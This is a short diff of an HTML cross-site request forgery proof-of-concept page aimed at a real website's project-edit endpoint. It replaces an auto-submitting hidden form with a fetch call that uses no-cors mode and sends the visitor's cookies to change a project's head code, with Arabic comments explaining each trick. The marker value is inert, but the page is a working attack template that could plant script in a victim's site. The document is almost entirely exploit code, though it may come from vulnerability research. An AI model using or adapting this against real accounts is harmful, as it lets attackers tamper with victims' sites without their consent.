@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>CSRF Test</title></head>
+<head><meta charset="UTF-8"><title>CSRF PoC - Fetch</title></head>
 <body>
 <h2>Loading...</h2>
-<form id="f" action="https://tilda.cc/projects/submit/" method="POST" target="sink">
-    <input type="hidden" name="comm" value="editprojectheadcode">
-    <input type="hidden" name="projectid" value="47575503">
-    <input type="hidden" name="headcode" value="CSRF_POC_MARKER_12345">
-</form>
-<iframe name="sink" style="width:1px;height:1px;border:0;"></iframe>
 <script>
-  window.addEventListener('load', function () {
-    document.getElementById('f').submit();
-  });
+  fetch('https://tilda.cc/projects/submit/', {
+    method: 'POST',
+    mode: 'no-cors', // يمنع المتصفح من حظر الطلب بسبب CORS
+    credentials: 'include', // يرسل الكوكيز الخاصة بالضحية
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'comm=editprojectheadcode&projectid=47575503&headcode=CSRF_POC_MARKER_12345'
+  }).catch(e => console.log('Request sent (opaque response)'));
 </script>
 </body>
 </html>
